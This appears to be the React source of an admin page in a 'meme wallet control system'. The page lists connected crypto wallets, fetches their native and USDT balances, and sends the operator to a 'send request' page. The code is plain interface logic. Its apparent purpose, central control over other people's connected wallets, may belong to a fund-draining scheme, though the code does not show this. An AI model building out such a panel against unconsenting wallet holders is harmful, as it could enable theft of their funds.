import React, { useEffect, useState } from "react";

export default function Wallets() {
  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);

  // Load wallets from backend
  useEffect(() => {
    async function loadWallets() {
      try {
        const res = await fetch(
          "https://meme-wallet-control-system-hx1r.vercel.app/api/admin-get-wallets"
        );
        const data = await res.json();
        if (data.success) {
          setWallets(data.wallets);
        }
      } catch (e) {
        console.log("Failed to load wallets", e);
      }
      setLoading(false);
    }

    loadWallets();
  }, []);

  const fetchBalance = async (address, chain) => {
    try {
      const res = await fetch(
        `https://meme-wallet-control-system-hx1r.vercel.app/api/get-balances?address=${address}&chain=${chain}`
      );
      const data = await res.json();
      return data.success ? data : { native: 0, usdt: 0 };
    } catch {
      return { native: 0, usdt: 0 };
    }
  };

  // Fetch balances for each wallet
  useEffect(() => {
    async function updateBalances() {
      const updated = await Promise.all(
        wallets.map(async (w) => {
          const b = await fetchBalance(w.address, w.chain);
          return { ...w, native: b.native, usdt: b.usdt };
        })
      );
      setWallets(updated);
    }

    if (wallets.length > 0) updateBalances();
  }, [wallets.length]);

  const goToSendRequest = (wallet) => {
    localStorage.setItem("selectedWallet", JSON.stringify(wallet));
    window.location.href = "/send-request";
  };

  if (loading) return <div className="page"><h2>Loading wallets…</h2></div>;

  return (
    <div className="page">
      <h1>Wallets</h1>

      {wallets.length === 0 ? (
        <p>No wallets connected yet.</p>
      ) : (
        <table className="table">
          <thead>
            <tr>
              <th>Address</th>
              <th>Chain</th>
              <th>Native Balance</th>
              <th>USDT Balance</th>
              <th>Action</th>
            </tr>
          </thead>

          <tbody>
            {wallets.map((w) => (
              <tr key={w.id}>
                <td>{w.address}</td>
                <td>{w.chain.toUpperCase()}</td>
                <td>{w.native ?? "0"}</td>
                <td>{w.usdt ?? "0"}</td>
                <td>
                  <button
                    className="btn"
                    onClick={() => goToSendRequest(w)}
                  >
                    Send Request →
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
}
